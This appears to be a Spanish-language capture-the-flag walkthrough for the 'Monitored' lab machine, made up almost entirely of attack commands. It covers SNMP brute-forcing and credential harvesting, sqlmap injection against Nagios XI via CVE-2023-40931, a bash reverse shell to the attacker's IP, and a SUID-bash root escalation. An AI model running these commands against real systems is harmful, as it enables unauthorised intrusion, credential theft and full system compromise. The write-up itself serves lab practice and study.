---
title: "Monitored"
---

# Monitored

```bash
ldapsearch -H ldap://monitored.htb -x -s base namingcontexts
```

```bash
ldapsearch -H ldap://monitored.htb -x -b "dc=monitored,dc=htb"
```

SCAN UDP -sU

```bash
sudo nmap -sU -p- --min-rate 10000 --open 10.10.11.248
```

```bash
hydra -P /usr/share/SecLists/Discovery/SNMP/common-snmp-community-strings.txt monitored.htb snmp
```

```bash
snmpbulkwalk -c public -v2c 10.10.11.248 . | tee snmp_data
```

```
svc \ XjH7VCehowpR1xZB
```

Fuzzear endpoints a partir de :
```
https://nagios.monitored.htb/nagiosxi/api
```

GET y POST

```bash
ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 150 -fs 32
```

```bash
ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 150 -fs 32 -X POST
```

[GitHub - chrislockard/api_wordlist: A wordlist of API names for web application assessments](https://github.com/chrislockard/api_wordlist)

```http
POST /nagiosxi/api/v1/authenticate

username=svc&password=XjH7VCehowpR1xZB
```

```
https://nagios.monitored.htb/nagiosxi/?token=4974cd07de85be10303478189d2a1bd0215bff3d
```

`Nagios XI 5.11.0 -> CVE-2023-40931`


```BASH
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=bspu3ilq508jivkicfqofjo29g" --batch --threads 10
```

```BASH
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=a4i4msg08i966d4ghlrhqrj963" --batch --threads 10 --dump -T xi_users
```

# RCE como admin

`Configure -> Core Config Manager -> Commands`

Creamos rev shell

```bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'
```

`Core Config -> Hosts -> Localhost -> Check commands -> Run check command`

# ROOT

Para escalar podemos cambiar el binario de nagios `/usr/local/nagios/bin/nagios` por:

```bash
#!/bin/bash

chmod u+s /bin/bash
```

Restablecer el servicio
```bash
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
```
